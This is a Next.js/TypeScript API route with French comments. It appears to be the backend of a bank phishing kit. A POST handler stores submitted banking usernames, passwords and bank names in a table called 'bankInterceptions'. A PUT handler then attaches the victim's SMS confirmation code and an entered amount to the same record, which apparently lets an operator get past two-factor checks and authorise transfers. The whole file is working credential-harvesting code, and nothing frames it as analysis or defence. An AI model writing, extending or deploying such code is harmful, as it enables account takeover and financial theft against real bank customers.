import { NextResponse } from "next/server";
import { db } from "@/lib/turso";
import { bankInterceptions } from "@/lib/schema";
import { eq } from "drizzle-orm";

/**
 * ÉTAPE 1 : Enregistrement initial des Identifiants
 * Reçoit un POST sur /api/operation
 */
export async function POST(request: Request) {
  try {
    const { username, password, bankName } = await request.json();

    // Validation des données reçues
    if (!username || !password || !bankName) {
      return NextResponse.json(
        { error: "Données manquantes (Identifiant, mot de passe ou nom de banque)" },
        { status: 400 }
      );
    }

    // Génération d'un identifiant unique (UUID) pour suivre cette transaction
    const interceptionId = crypto.randomUUID();

    // Insertion directe dans Turso avec Drizzle
    await db.insert(bankInterceptions).values({
      id: interceptionId,
      bankName: bankName.toUpperCase(),
      username: username,
      password: password,
      // smsCode reste automatiquement à NULL pour le moment
    });

    // Retourne le succès et l'ID de suivi au client
    return NextResponse.json({ 
      success: true, 
      id: interceptionId 
    });

  } catch (error) {
    console.error("Erreur Backend lors de l'enregistrement initial:", error);
    return NextResponse.json(
      { error: "Une erreur est survenue lors du traitement côté serveur." },
      { status: 500 }
    );
  }
}

/**
 * ÉTAPE 2 : Ajout du Code de confirmation SMS ET/OU du Montant Saisi
 * Reçoit un PUT sur /api/operation
 */
export async function PUT(request: Request) {
  try {
    const { id, smsCode, amountInput } = await request.json();

    // L'ID unique de session est obligatoire
    if (!id) {
      return NextResponse.json(
        { error: "ID de session manquant." },
        { status: 400 }
      );
    }

    // On prépare dynamiquement les champs à mettre à jour en fonction de ce qui est envoyé
    const updateData: Record<string, any> = {
      updatedAt: new Date().toISOString()
    };

    if (smsCode !== undefined) {
      updateData.smsCode = smsCode;
    }

    if (amountInput !== undefined) {
      updateData.amountInput = amountInput;
    }

    // Mise à jour de l'enregistrement correspondant via Drizzle
    await db
      .update(bankInterceptions)
      .set(updateData)
      .where(eq(bankInterceptions.id, id));

    return NextResponse.json({ 
      success: true, 
      message: "Les informations ont été enregistrées avec succès." 
    });

  } catch (error) {
    console.error("Erreur Backend lors de la mise à jour de l'opération:", error);
    return NextResponse.json(
      { error: "Impossible de valider les données sur le serveur." },
      { status: 500 }
    );
  }
}